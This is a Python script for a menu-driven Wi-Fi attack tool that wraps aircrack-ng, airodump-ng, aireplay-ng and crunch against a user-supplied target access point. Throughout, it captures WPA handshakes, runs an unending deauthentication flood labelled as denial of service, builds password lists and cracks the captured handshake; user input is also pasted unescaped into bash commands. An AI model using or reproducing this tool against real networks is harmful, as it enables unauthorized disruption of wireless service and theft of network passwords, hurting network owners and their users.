import subprocess
from GenCharlist import *
import getpass
import time
import os
import re
class Attack:
    def __init__(self, mac, iface, filename, wordlist, iface_mon,channel,band,output_cap):
        self.mac = mac
        self.iface = iface
        self.filename = filename
        self.wordlist = wordlist
        self.iface_mon = iface_mon
        self.channel = channel
        self.band = band
        self.output_cap = output_cap
    def kill_conflicting_processes(self):
        print("Killing interfering processes...")
        subprocess.run(["airmon-ng", "check", "kill"])
        time.sleep(2)  # Wait a moment to ensure processes are killed
    def find_channel(self):
        self.kill_conflicting_processes()
        # Command to run airmon-ng and airodump-ng
        command = f"airmon-ng start {self.iface} && airodump-ng {self.iface} -d {self.mac} --band {self.band}; echo 'Press Enter to exit...'; read"
        # Open a new GNOME Terminal and run the command
        subprocess.run(["gnome-terminal", "--", "bash", "-c", command])
        
   
    def cap_handshake(self):
        command= f"airodump-ng {self.iface_mon} -d {self.mac} -c {self.channel} -w {self.output_cap}; echo 'Press Enter to exit...'; read"
        subprocess.run(["gnome-terminal", "--", "bash", "-c", command])
        
    def dos(self):
        
        command= f"aireplay-ng --deauth 0 -a {self.mac} {self.iface_mon} ; echo 'Press Enter to exit...'; read"

        subprocess.run(["gnome-terminal", "--", "bash", "-c", command])
        

    
    def crack(self):
        # Check if all required parameters are set
        if not self.wordlist:
            print("Error: Please specify a dictionary (option -w).")
            return
        if not self.mac:
            print("Error: MAC address (option -b) is missing.")
            return
        if not self.output_cap:
            print("Error: Capture file (output_cap) is missing.")
            return

        # Construct and run the aircrack-ng command in a new terminal
        command = f"aircrack-ng -w {self.wordlist} -b {self.mac} {self.output_cap} ; echo 'Press Enter to exit...'; read"
        subprocess.run(["gnome-terminal", "--", "bash", "-c", command])
        
    def generate_pass(self, monster, filepasswords):
        self.monster = monster
        self.filepasswords = filepasswords
        subprocess.run(['crunch', '10', '10', '-t', self.monster, '-o', self.filepasswords])
        
    def restart_nm(self):
        subprocess.run(['systemctl', 'restart', 'NetworkManager'])

    def find_info_about_ap(self):
        command_str = 'nmcli -f SSID,CHAN,BSSID dev wifi'
        subprocess.run(command_str,shell=True)
    def channeloriented(self):
        self.channel = input('choose the channel that you see:')
        command_str = f'airodump-ng {self.iface_mon} -d {self.mac} -c {self.channel}'
        subprocess.run(["gnome-terminal", "--", "bash", "-c", command_str])
    def wireshark_EAPOL(self):
        command_str = f'wireshark {self.output_cap}'
        subprocess.run(["gnome-terminal", "--", "bash", "-c", command_str])

    @staticmethod
    def menu():
        print("Welcome to the Attack Menu")
        print("1. Find Channel /run it second")
        print("2. Capture Handshake")
        print("3. Denial of Service (DoS)")
        print("4. Crack Handshake")
        print("5. Generate Password List")
        print("6. Restart Network Manager/ ensure this is up before executing 00")
        print("00. find info about ap (run it first)")
        print("001. see Eapol in wiresherk")
        print("0. Exit")
        choice = input("Enter your choice: ")
        return choice
def main():
        mac = input("Enter target MAC address (e.g: xx:xx:xx:xx:xx:xx): ")
        iface = input("Enter your interface (e.g. wlan0): ")
        iface_mon = iface
        filename = input("Enter filename to save capture (e.g password_dictionary): ")

        choice = input("Do you have a list yes or press enter we have one for you")
        if choice == "yes":
            wordlist = input("Enter path to wordlist: ")
        else:
            print("So you dont have then follow enter part of known keyword")
            base_word = getpass.getpass("Enter part of the password to add random specials:")
            wordlist = "generated_password_wifi.txt"
            generate_password(base_word,filename)
        channel = ''
        band = ''
        output_cap = 'hack0'
        attack = Attack(mac, iface, filename, wordlist, iface_mon,channel,band,output_cap)
        while True:
            choice = Attack.menu()
            
            if choice == "00":
                attack.find_info_about_ap()
                attack.mac = input("Enter AP MAC address from step 00 or the router's BSSID MAC address for Hydra: ")
                
            elif choice == "1":
                band = input("Enter band (like 'a', 'ab', 'abg') or press Enter for default ('abg'): ")
                if not band:
                    band = 'abg'  # Default value if input is empty
                attack.band = band
                print("Press CTRL + C to stop channel scanning.")
                attack.find_channel()
                input("Press Enter to proceed.")
                attack.channeloriented()
                
            elif choice == "2":
                channel = input("Enter the channel number: ")
                attack.channel = channel
                attack.cap_handshake()
                
            elif choice == "3":
                attack.iface_mon = iface_mon
                attack.dos()
                
            elif choice == "4":
                
                
                # Pattern to match files like 'hack0-01.cap'
                pattern = r'hack\d+-\d+\.cap'
                files = os.listdir()

                # Attempt to find files matching the pattern
                found_files = [f for f in files if re.search(pattern, f)]

                if found_files:
                    # If files are found, set the first match to output_cap
                    attack.output_cap = found_files[0]
                    print("Matching file found:", attack.output_cap)
                    
                    attack.wordlist = filename
                    attack.crack()  # Uncomment to execute the crack function
                else:
                    # Provide feedback if no files match
                    print("No matching files found. File not created yet, unable to crack")
                    
            elif choice == "5":
                monster = input("Enter pattern for password generation (e.g., abc%%%%%%): ")
                filepasswords = input("Enter output file for passwords: ")
                attack.generate_pass(monster, filepasswords)
                
            elif choice == "001":
                attack.wireshark_EAPOL()
                
            elif choice == "6":
                attack.restart_nm()
                time.sleep(2)
                
            elif choice == "0":
                print("Exiting...")
                break
                
            else:
                print("Invalid choice, please try again.")


if __name__ == "__main__":
    main()
